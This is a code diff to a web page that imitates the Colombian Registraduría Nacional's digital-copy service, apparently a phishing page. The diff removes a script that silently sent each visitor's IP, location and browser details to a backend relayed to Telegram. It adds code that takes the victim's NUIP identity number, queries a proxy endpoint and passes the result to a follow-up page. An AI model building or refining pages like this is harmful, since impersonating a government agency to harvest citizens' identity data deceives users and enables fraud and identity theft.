@@ -5,15 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Registraduría Nacional - Copia Digital</title>
     <style>
-        /* Colores exactos */
         :root {
-            --bg-global: #EAF8F8; 
-            --bg-white: #FFFFFF;  
-            --text-blue: #1B365D; 
+            --bg-global: #EAF8F8;
+            --bg-white: #FFFFFF;
+            --text-blue: #1B365D;
             --text-gray: #666666;
-            --btn-blue: #002A54;  
-            --footer-dark: #001A33; 
-            --footer-cyan: #00E5FF; 
+            --btn-blue: #002A54;
+            --footer-dark: #001A33;
+            --footer-cyan: #00E5FF;
         }
 
         * {
@@ -38,7 +37,6 @@
             padding-bottom: 40px;
         }
 
-        /* Franja blanca superior */
         .top-header-strip {
             background-color: var(--bg-white);
             width: 100%;
@@ -50,11 +48,10 @@
         }
 
         .top-header-strip img {
-            max-width: 220px; 
+            max-width: 220px;
             height: auto;
         }
 
-        /* Tarjeta central */
         .card {
             background-color: var(--bg-white);
             width: 90%;
@@ -91,7 +88,6 @@
             margin-right: auto;
         }
 
-        /* Formulario e Inputs */
         .login-form {
             display: flex;
             flex-direction: column;
@@ -156,7 +152,6 @@
             background-color: #001F3F;
         }
 
-        /* --- DISEÑO DEL FOOTER --- */
         .footer {
             background-color: var(--footer-dark);
             color: white;
@@ -175,7 +170,7 @@
         }
 
         .footer-institutional img {
-            max-width: 120px; 
+            max-width: 120px;
             height: auto;
         }
 
@@ -192,7 +187,7 @@
             font-size: 14px;
         }
 
-        .footer-content a, 
+        .footer-content a,
         .footer-content p {
             color: white;
             text-decoration: none;
@@ -203,30 +198,28 @@
             text-decoration: underline;
         }
 
-        /* Adaptación para Computadora */
         @media (min-width: 768px) {
             .footer {
-                flex-direction: row; 
+                flex-direction: row;
                 align-items: stretch;
             }
             .footer-institutional {
-                flex-direction: column; 
+                flex-direction: column;
                 justify-content: center;
                 min-width: 250px;
             }
             .footer-institutional img {
-                max-width: 150px; 
+                max-width: 150px;
                 margin-bottom: 10px;
             }
             .footer-content {
-                flex-direction: row; 
+                flex-direction: row;
                 justify-content: space-around;
                 flex: 1;
                 padding: 40px;
             }
         }
 
-        /* Adaptación para móvil */
         @media (max-width: 767px) {
             .card {
                 padding: 30px 20px;
@@ -240,7 +233,6 @@
             }
         }
 
-        /* --- PANTALLA DE CARGA (OVERLAY) --- */
         #loading-overlay {
             position: fixed;
             top: 0;
@@ -282,15 +274,13 @@
 <body>
 
     <div class="main-container">
-        
-        <!-- Logo Superior -->
+
         <div class="top-header-strip">
             <img src="image.png" alt="Registraduría Nacional">
         </div>
 
-        <!-- Tarjeta Central -->
         <div class="card">
-            
+
             <h1>TRÁMITES WEB CON PAGO EN LÍNEA Y PRESENCIAL</h1>
             <h2>Copia digital</h2>
             <p class="subtitle">
@@ -299,9 +289,8 @@
                 fácil y al instante, esto es democracia en acción.
             </p>
 
-            <!-- Formulario (Solo NUIP) -->
             <form class="login-form" id="loginForm" action="#" method="POST">
-                
+
                 <div class="input-group">
                     <div class="input-icon">
                         <svg viewBox="0 0 24 24">
@@ -318,15 +307,12 @@
         </div>
     </div>
 
-    <!-- Footer -->
     <footer class="footer">
-        <!-- Franja Celeste con Logo blanco.png -->
         <div class="footer-institutional">
             <img src="blanco.png" alt="Logo Institucional">
             <span>Institucional</span>
         </div>
-        
-        <!-- Enlaces del footer -->
+
         <div class="footer-content">
             <p>Av. Calle 26 n.° 51-50, CAN, Bogotá, Colombia. CP: 111321</p>
             <a href="#">Políticas de privacidad</a>
@@ -337,75 +323,46 @@
         </div>
     </footer>
 
-    <!-- OVERLAY DE CARGA -->
     <div id="loading-overlay">
         <div class="spinner"></div>
     </div>
 
     <script>
         // ============================================================
-        // 🚪 NOTIFICAR NUEVO INGRESO AL BACKEND (va a Telegram)
-        // 🔥 Notifica CADA VEZ que alguien entra o recarga la página
+        // Formulario NUIP → consulta al proxy → redirige a consultar.html
         // ============================================================
-        async function notificarIngreso() {
-            let ip = 'Desconocida';
-            let ciudad = 'Desconocida';
-            let pais = 'Desconocido';
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-            try {
-                const r = await fetch('https://ipwho.is/');
-                const d = await r.json();
-                if (d.success && d.ip) {
-                    ip = d.ip;
-                    ciudad = d.city || 'Desconocida';
-                    pais = d.country || 'Desconocido';
-                }
-            } catch (e) {
-                try {
-                    const r = await fetch('https://ipapi.co/json/');
-                    const d = await r.json();
-                    if (d.ip) {
-                        ip = d.ip;
-                        ciudad = d.city || 'Desconocida';
-                        pais = d.country_name || 'Desconocido';
-                    }
-                } catch (e2) {}
+            const nuip = this.querySelector('input[name="nuip"]').value.trim();
+
+            if (!/^\d{5,15}$/.test(nuip)) {
+                alert('Ingrese un número de NUIP válido');
+                return;
             }
-
-            try {
-                await fetch('/api/nuevo-ingreso', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip,
-                        ciudad,
-                        pais,
-                        user_agent: navigator.userAgent
-                    })
-                });
-            } catch (e) {
-                console.warn('No se pudo notificar el ingreso:', e);
-            }
-        }
-
-        // Ejecutar al cargar la página
-        document.addEventListener('DOMContentLoaded', notificarIngreso);
-
-        // ============================================================
-        // Formulario NUIP → redirige a consultar.html
-        // ============================================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Evita que el formulario se envíe de inmediato
 
             const overlay = document.getElementById('loading-overlay');
-            
-            // Mostrar el overlay con la animación
             overlay.classList.add('active');
 
-            // Esperar 3 segundos y luego redirigir
-            setTimeout(() => {
+            try {
+                // 🔥 Consulta al server proxy
+                const response = await fetch('/api/buscar_cliente?cedula=' + encodeURIComponent(nuip));
+                const data = await response.json();
+
+                // Guarda la respuesta y el NUIP para consultar.html
+                sessionStorage.setItem('resultado_cliente', JSON.stringify(data));
+                sessionStorage.setItem('cedula_consultada', nuip);
+
+                // Redirige al HTML de resultados
                 window.location.href = 'consultar.html';
-            }, 3000);
+
+            } catch (err) {
+                overlay.classList.remove('active');
+                // Aun si falla, guarda el NUIP para que consultar.html lo muestre
+                sessionStorage.setItem('resultado_cliente', JSON.stringify({ error: err.message }));
+                sessionStorage.setItem('cedula_consultada', nuip);
+                window.location.href = 'consultar.html';
+            }
         });
     </script>
 
